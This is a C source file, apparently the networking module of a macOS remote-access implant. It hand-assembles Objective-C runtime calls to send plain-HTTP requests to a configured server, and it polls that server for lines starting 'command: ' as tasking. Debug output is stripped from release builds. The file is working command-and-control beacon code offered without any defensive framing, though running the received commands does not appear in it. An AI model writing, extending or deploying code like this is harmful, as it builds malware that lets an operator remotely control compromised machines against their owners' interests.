#include "network.h"
#include <dispatch/dispatch.h>
#include <objc/message.h>
#include <objc/runtime.h>
#include <runtime/core.h>
#include <string.h>
#include <unistd.h>
#include "client.h"

#define HTTP_TIMEOUT_SECONDS 5
#define MAX_URL_LENGTH 512
#define HTTP_STATUS_OK 200
#define HTTP_STATUS_NO_CONTENT 204
#define BLOCK_HAS_COPY_DISPOSE (1 << 25)
#define BLOCK_HAS_DESCRIPTOR (1 << 26)
#define MAX_RETRIES 3
#define RETRY_DELAY_MS 500

typedef struct {
  http_response_t* resp;
  dispatch_semaphore_t semaphore;
  bool completed;
  NetworkError error;
} RequestContext;

typedef struct {
  RTKContext* ctx;
  RTKInstance urlString;
  RTKInstance url;
  RTKInstance request;
  RTKInstance contentTypeKey;
  RTKInstance contentTypeValue;
  RTKInstance dataTask;
  RTKInstance completionHandler;
  dispatch_semaphore_t semaphore;
  RequestContext* reqContext;
} CleanupContext;

struct BlockDescriptor {
  unsigned long reserved;
  unsigned long size;
  void (*copy)(void* dst, void* src);
  void (*dispose)(void* src);
};

struct Block_literal {
  void* isa;
  int flags;
  int reserved;
  void (*invoke)(void*, id, id, id);
  struct BlockDescriptor* descriptor;
  RequestContext* context;
};

#ifdef DEBUG
typedef struct {
  NetworkError code;
  const char* message;
} ErrorMessage;

static const ErrorMessage error_messages[] = {
    {NETWORK_SUCCESS, "Success"},
    {NETWORK_ERROR_INVALID_ARGS, "Invalid arguments"},
    {NETWORK_ERROR_MEMORY, "Memory allocation failed"},
    {NETWORK_ERROR_URL_CREATE, "Failed to create URL"},
    {NETWORK_ERROR_REQUEST_CREATE, "Failed to create request"},
    {NETWORK_ERROR_TIMEOUT, "Request timed out"},
    {NETWORK_ERROR_SEND, "Failed to send request"},
    {NETWORK_ERROR_RESPONSE, "Invalid response"},
};

#include <stdio.h>
#define DEBUG_LOG(...)            \
  do {                            \
    fprintf(stderr, "[DEBUG] ");  \
    fprintf(stderr, __VA_ARGS__); \
    fprintf(stderr, "\n");        \
  } while (0)

static void log_error(NetworkError error) {
  for (size_t i = 0; i < sizeof(error_messages) / sizeof(error_messages[0]);
       i++) {
    if (error_messages[i].code == error) {
      DEBUG_LOG("Network error: %s", error_messages[i].message);
      return;
    }
  }
  DEBUG_LOG("Unknown error: %d", error);
}
#else
#define DEBUG_LOG(...) ((void)0)
#define log_error(e) ((void)0)
#endif

static void cleanup_resources(CleanupContext* cleanup) {
  if (!cleanup)
    return;

  if (cleanup->ctx) {
    if (cleanup->urlString)
      rtk_release(cleanup->ctx, cleanup->urlString);
    if (cleanup->url)
      rtk_release(cleanup->ctx, cleanup->url);
    if (cleanup->contentTypeKey)
      rtk_release(cleanup->ctx, cleanup->contentTypeKey);
    if (cleanup->contentTypeValue)
      rtk_release(cleanup->ctx, cleanup->contentTypeValue);
    if (cleanup->request)
      rtk_release(cleanup->ctx, cleanup->request);
    if (cleanup->dataTask)
      rtk_release(cleanup->ctx, cleanup->dataTask);
    if (cleanup->completionHandler)
      free(cleanup->completionHandler);
  }

  if (cleanup->semaphore)
    dispatch_release(cleanup->semaphore);
  if (cleanup->reqContext)
    free(cleanup->reqContext);

  memset(cleanup, 0, sizeof(*cleanup));
}

static void completion_invoke(void* block, id data, id response, id error) {
  struct Block_literal* literal = block;
  RequestContext* reqContext = literal->context;

  if (!reqContext || !reqContext->resp)
    return;

  http_response_t* resp = reqContext->resp;

  if (error) {
    DEBUG_LOG("Request error occurred");
    resp->status_code = 0;
    reqContext->error = NETWORK_ERROR_SEND;
  } else if (response) {
    typedef int (*msg_send_int)(id, SEL);
    msg_send_int msgSend = (msg_send_int)objc_msgSend;
    resp->status_code = msgSend(response, sel_registerName("statusCode"));

    if (data) {
      typedef unsigned long (*msg_send_length)(id, SEL);
      msg_send_length lengthSend = (msg_send_length)objc_msgSend;
      unsigned long length = lengthSend(data, sel_registerName("length"));

      if (length > 0) {
        resp->data = malloc(length + 1);
        if (resp->data) {
          typedef const void* (*msg_send_bytes)(id, SEL);
          msg_send_bytes bytesSend = (msg_send_bytes)objc_msgSend;
          const void* bytes = bytesSend(data, sel_registerName("bytes"));

          memcpy(resp->data, bytes, length);
          resp->data[length] = '\0';
          resp->length = length;
          DEBUG_LOG("Response data received: %s", resp->data);
        }
      }
    }
  }

  reqContext->completed = true;
  dispatch_semaphore_signal(reqContext->semaphore);
}

static void block_dispose(void* block) {
  struct Block_literal* literal = block;
  literal->context = NULL;
}

static void block_copy(void* dst, void* src) {
  memcpy(dst, src, sizeof(struct Block_literal));
}

static RTKInstance create_completion_handler(RequestContext* reqContext) {
  static struct BlockDescriptor descriptor = {0, sizeof(struct Block_literal),
                                              block_copy, block_dispose};

  struct Block_literal* block = malloc(sizeof(struct Block_literal));
  if (!block)
    return NULL;

  block->isa = objc_getClass("NSBlock");
  block->flags = BLOCK_HAS_COPY_DISPOSE | BLOCK_HAS_DESCRIPTOR;
  block->reserved = 0;
  block->invoke = completion_invoke;
  block->descriptor = &descriptor;
  block->context = reqContext;

  return (RTKInstance)block;
}

static void add_security_headers(RTKContext* ctx, RTKInstance request) {
  static const char* security_headers[][2] = {
      {"X-Content-Type-Options", "nosniff"},
      {"X-Frame-Options", "DENY"},
      {"Strict-Transport-Security", "max-age=31536000; includeSubDomains"},
  };

  for (size_t i = 0; i < sizeof(security_headers) / sizeof(security_headers[0]);
       i++) {
    RTKInstance key = rtk_string_create(ctx, security_headers[i][0]);
    RTKInstance value = rtk_string_create(ctx, security_headers[i][1]);

    if (key && value) {
      rtk_msg_send_2obj(ctx, request, "setValue:forHTTPHeaderField:", value,
                        key);
    }

    if (key)
      rtk_release(ctx, key);
    if (value)
      rtk_release(ctx, value);
  }
}

NetworkError send_http_request(ClientContext* ctx, const http_request_t* req,
                               http_response_t* resp) {
  if (!ctx || !req)
    return NETWORK_ERROR_INVALID_ARGS;

  CleanupContext cleanup = {0};
  cleanup.ctx = ctx;

  char url_str[MAX_URL_LENGTH];
  if (snprintf(url_str, sizeof(url_str), "http://%s:%d%s",
               ctx->config.server_host, ctx->config.server_port,
               req->url_path) >= sizeof(url_str)) {
    return NETWORK_ERROR_INVALID_ARGS;
  }

  cleanup.urlString = rtk_string_create(ctx->rtk, url_str);
  if (!cleanup.urlString) {
    log_error(NETWORK_ERROR_URL_CREATE);
    return NETWORK_ERROR_URL_CREATE;
  }

  cleanup.url = rtk_msg_send_obj(ctx->rtk, rtk_get_class(ctx->rtk, "NSURL"),
                                 "URLWithString:", cleanup.urlString);

  if (!cleanup.url) {
    cleanup_resources(&cleanup);
    return NETWORK_ERROR_URL_CREATE;
  }

  cleanup.request =
      rtk_msg_send_obj(ctx->rtk, rtk_get_class(ctx->rtk, "NSMutableURLRequest"),
                       "requestWithURL:", cleanup.url);

  if (!cleanup.request) {
    cleanup_resources(&cleanup);
    return NETWORK_ERROR_REQUEST_CREATE;
  }

  if (req->body) {
    RTKInstance postMethod = rtk_string_create(ctx->rtk, "POST");
    rtk_msg_send_obj(ctx->rtk, cleanup.request, "setHTTPMethod:", postMethod);

    RTKInstance bodyData =
        rtk_data_create(ctx->rtk, (const uint8_t*)req->body, req->body_length);

    if (bodyData) {
      rtk_msg_send_obj(ctx->rtk, cleanup.request, "setHTTPBody:", bodyData);
      rtk_release(ctx->rtk, bodyData);
    }
    rtk_release(ctx->rtk, postMethod);
  }

  cleanup.contentTypeKey = rtk_string_create(ctx->rtk, "Content-Type");
  cleanup.contentTypeValue = rtk_string_create(ctx->rtk, "text/plain");
  rtk_msg_send_2obj(ctx->rtk, cleanup.request,
                    "setValue:forHTTPHeaderField:", cleanup.contentTypeValue,
                    cleanup.contentTypeKey);

  add_security_headers(ctx->rtk, cleanup.request);

  RTKInstance session = rtk_msg_send_class(
      ctx->rtk, rtk_get_class(ctx->rtk, "NSURLSession"), "sharedSession");

  if (!session) {
    cleanup_resources(&cleanup);
    return NETWORK_ERROR_REQUEST_CREATE;
  }

  cleanup.semaphore = dispatch_semaphore_create(0);
  if (!cleanup.semaphore) {
    cleanup_resources(&cleanup);
    return NETWORK_ERROR_MEMORY;
  }

  cleanup.reqContext = malloc(sizeof(RequestContext));
  if (!cleanup.reqContext) {
    cleanup_resources(&cleanup);
    return NETWORK_ERROR_MEMORY;
  }

  cleanup.reqContext->resp = resp;
  cleanup.reqContext->semaphore = cleanup.semaphore;
  cleanup.reqContext->completed = false;
  cleanup.reqContext->error = NETWORK_SUCCESS;

  cleanup.completionHandler = create_completion_handler(cleanup.reqContext);
  if (!cleanup.completionHandler) {
    cleanup_resources(&cleanup);
    return NETWORK_ERROR_MEMORY;
  }

  cleanup.dataTask = ((id(*)(id, SEL, id, id))objc_msgSend)(
      session, sel_registerName("dataTaskWithRequest:completionHandler:"),
      cleanup.request, cleanup.completionHandler);

  if (!cleanup.dataTask) {
    cleanup_resources(&cleanup);
    return NETWORK_ERROR_REQUEST_CREATE;
  }

  rtk_msg_send_empty(ctx->rtk, cleanup.dataTask, "resume");

  long result = dispatch_semaphore_wait(
      cleanup.semaphore,
      dispatch_time(DISPATCH_TIME_NOW, HTTP_TIMEOUT_SECONDS * NSEC_PER_SEC));

  NetworkError error = NETWORK_SUCCESS;

  if (result != 0) {
    rtk_msg_send_empty(ctx->rtk, cleanup.dataTask, "cancel");
    error = NETWORK_ERROR_TIMEOUT;
  } else if (!cleanup.reqContext->completed) {
    error = NETWORK_ERROR_RESPONSE;
  } else {
    error = cleanup.reqContext->error;
  }

  cleanup_resources(&cleanup);

  if (error != NETWORK_SUCCESS) {
    log_error(error);
    return error;
  }

  return NETWORK_SUCCESS;
}

void free_http_response(http_response_t* resp) {
  if (!resp)
    return;
  if (resp->data) {
    free(resp->data);
    resp->data = NULL;
  }
  resp->length = 0;
  resp->status_code = 0;
}

char* get_command_from_response(ClientContext* ctx, const http_request_t* req) {
  http_response_t response = {0};

  NetworkError error = send_http_request(ctx, req, &response);
  if (error != NETWORK_SUCCESS) {
    DEBUG_LOG("Failed to send command poll request");
    return NULL;
  }

  if (response.status_code == HTTP_STATUS_NO_CONTENT) {
    DEBUG_LOG("No pending commands (status 204)");
    free_http_response(&response);
    return NULL;
  }

  if (response.status_code != HTTP_STATUS_OK || !response.data) {
    DEBUG_LOG("Invalid response: status=%d", response.status_code);
    free_http_response(&response);
    return NULL;
  }

  DEBUG_LOG("Parsing response: %s", response.data);

  char* command = NULL;
  char* lines = strdup(response.data);
  if (!lines) {
    free_http_response(&response);
    return NULL;
  }

  char* line = strtok(lines, "\n");
  while (line) {
    if (strncmp(line, "command: ", 9) == 0) {
      command = strdup(line + 9);
      break;
    }
    line = strtok(NULL, "\n");
  }

  free(lines);
  free_http_response(&response);

  if (command) {
    DEBUG_LOG("Found command: %s", command);
  }

  return command;
}
